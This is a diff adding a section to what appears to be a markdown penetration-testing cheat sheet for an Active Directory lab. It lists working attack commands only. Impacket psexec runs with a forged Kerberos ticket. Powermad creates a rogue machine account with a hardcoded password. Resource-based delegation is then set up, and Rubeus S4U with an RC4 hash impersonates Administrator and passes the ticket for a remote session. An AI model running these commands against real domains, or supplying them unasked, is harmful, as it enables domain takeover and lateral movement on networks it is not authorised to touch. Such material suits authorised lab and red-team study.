@@ -33,3 +33,15 @@ impacket-ticketConverter cif_cifs_John-activebreach.io.kirbi admin.ccache
 export KRB5CCNAME=admin.ccache
 proxychains impacket-psexec -k -no-pass -target-ip 10.10.10.110 -dc-ip 10.10.10.10 John-activebreach.io
 ```
+
+### Adding Computer Account
+```
+Import-Module .\Powermad.psd1
+New-MachineAccount -Domain activebreach.io -DomainController 10.10.10.10 -MachineAccount Alice -Password (ConvertTo-SecureString 'Password!@#' -AsPlainText -Force) -Verbose
+Import-Module C:\AD\Tools\ADModulemaster\Microsoft.ActiveDirectory.Management.dll
+Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
+Set-ADComputer Alice.activebreach.io -PrincipalsAllowedToDelegateToAccount Alice$ -Verbose
+Rubeus.exe s4u /user:Alice$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/Alice.activebreach.io /impersonateuser:Administrator /ptt
+Enter-PSSession -ComputerName Alice.activebreach.io
+```
+
